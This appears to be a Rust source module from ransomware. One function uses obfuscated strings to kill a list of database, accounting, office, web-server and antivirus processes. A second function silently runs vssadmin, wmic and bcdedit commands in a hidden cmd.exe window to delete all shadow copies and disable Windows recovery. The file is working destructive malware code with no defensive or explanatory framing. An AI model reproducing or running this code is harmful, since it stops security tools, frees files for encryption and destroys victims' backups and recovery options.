use sysinfo::{ProcessExt, System, SystemExt};
use std::os::windows::process::CommandExt;
use obfstr::obfstr;

pub fn kproc()
{
    let blacklist:[String; 28]= [obfstr!("firefox.exe").to_string(),obfstr!("sqlservr.exe").to_string(),obfstr!("sqlmangr.exe").to_string(),obfstr!("RAgui.exe").to_string(),obfstr!("QBCFMonitorService.exe").to_string(),obfstr!("supervise.exe").to_string(),obfstr!("fdhost.exe").to_string(),obfstr!("Culture.exe").to_string(),obfstr!("RTVscan.exe").to_string(),obfstr!("Defwatch.exe").to_string(),obfstr!("wxServerView.exe").to_string(),obfstr!("sqlbrowser.exe").to_string(),obfstr!("winword.exe").to_string(),obfstr!("GDscan.exe").to_string(),obfstr!("QBW32.exe").to_string(),obfstr!("QBDBMgr.exe").to_string(),obfstr!("qbupdate.exe").to_string(),obfstr!("axlbridge.exe").to_string(),obfstr!("360se.exe").to_string(),obfstr!("360doctor.exe").to_string(),obfstr!("QBIDPService.exe").to_string(),obfstr!("wxServer.exe").to_string(),obfstr!("httpd.exe").to_string(),obfstr!("fdlauncher.exe").to_string(),obfstr!("MsDtSrvr.exe").to_string(),obfstr!("tomcat6.exe").to_string(),obfstr!("java.exe").to_string(),obfstr!("wdswfsafe.exe").to_string()];
    let sys = System::new_all();
    let mut procs: Vec<String> = vec![];

    for (pid, process) in sys.processes() 
    {
        procs.push(format!("[{}] {}", pid, process.name()));

        if blacklist.contains(&process.name().to_string())
        {
            process.kill();
        }
    }

}

pub fn recovery()->bool
{
    match std::process::Command::new(obfstr!("cmd.exe"))
    .arg(format!("{}",obfstr!("/min /Q /C vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no"))).creation_flags(0x08000000)
    .spawn()
    {
        Ok(_o) =>true,
        Err(_o) =>false,
    }
}